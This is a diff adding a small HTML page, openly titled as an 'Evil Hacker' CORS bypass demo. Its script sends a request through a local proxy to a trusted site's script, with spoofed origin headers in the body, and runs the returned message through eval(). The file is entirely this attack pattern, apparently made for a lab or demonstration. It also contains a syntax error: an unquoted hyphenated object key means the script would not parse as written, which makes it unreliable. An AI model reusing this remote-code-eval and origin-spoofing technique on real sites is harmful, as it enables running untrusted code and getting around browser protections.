@@ -1,0 +1,33 @@
+<html>
+ <head>
+   <meta charset="UTF-8">
+   <title> Evil Hacker Web Server (CORS SCRIPT BYPASS USING XHR)</title>
+ </head>
+ <body>
+   <div>
+     <script>
+        var xhr = new XMLHttpRequest();
+
+        xhr.open('POST', 'http://localhost:8082/http://trustedsite.com/hello_script.js', true);
+
+        // If the line below is set, we get the error:
+        // Attempt to set a forbidden header was denied: Origin
+        // xhr.setRequestHeader('Origin','http://trustedsite.com');
+
+        let data = {
+          headers: {
+            origin: "http://trustedsite.com",
+            x-requested-with: "http://trustedsite.com",
+         }
+        };
+
+        xhr.onload = function() {
+          let responseObj = xhr.response;
+          eval(responseObj.message);
+        };
+
+        xhr.send(JSON.stringify(data));
+     </script>
+    </div>
+ </body>
+</html>
